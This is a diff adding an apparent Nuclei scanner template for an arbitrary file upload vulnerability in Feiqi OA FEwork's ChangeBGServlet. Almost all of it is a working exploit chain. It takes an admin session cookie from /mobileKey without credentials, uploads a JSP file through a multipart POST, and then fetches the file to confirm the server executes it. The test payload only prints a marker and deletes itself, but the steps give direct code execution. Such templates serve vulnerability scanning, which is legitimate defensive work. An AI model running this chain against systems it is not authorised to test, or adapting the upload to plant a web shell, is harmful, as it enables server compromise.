@@ -1,0 +1,62 @@
+id: feiqiOA-FEwork-ChangeBGServlet-File-upload
+
+info:
+  name: 飞企互联OA FEwork ChangeBGServlet 任意文件上传漏洞
+  author: feiqiOA
+  severity: high
+  tags: File upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /mobileKey HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        userName=admin
+    extractors:
+       - type: regex 
+         part: header
+         name: SESSION
+         group: 1
+         regex:
+           - 'SESSION=(.*?);'
+         internal: true
+  - raw:
+      - |
+        POST /servlet/ChangeBGServlet HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: SESSION={{SESSION}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk
+
+        ------WebKitFormBoundaryKNt0t4vBe8cX9rZk
+        Content-Disposition: form-data; name="file"; filename="{{username}}.jsp"
+        Content-Type: text/plain
+
+        <% out.println("sectestsectest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ------WebKitFormBoundaryKNt0t4vBe8cX9rZk--
+    extractors:
+       - type: regex 
+         part: body
+         name: uploadfile
+         group: 1
+         regex:
+           - '([a-zA-Z0-9]+\.jsp)'
+         internal: true
+  - raw:
+      - |
+        GET /login/applyTheme/images/portal/login/{{uploadfile}} HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: SESSION={{SESSION}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'sectestsectest'
+      - type: status
+        status: 
+          - 200
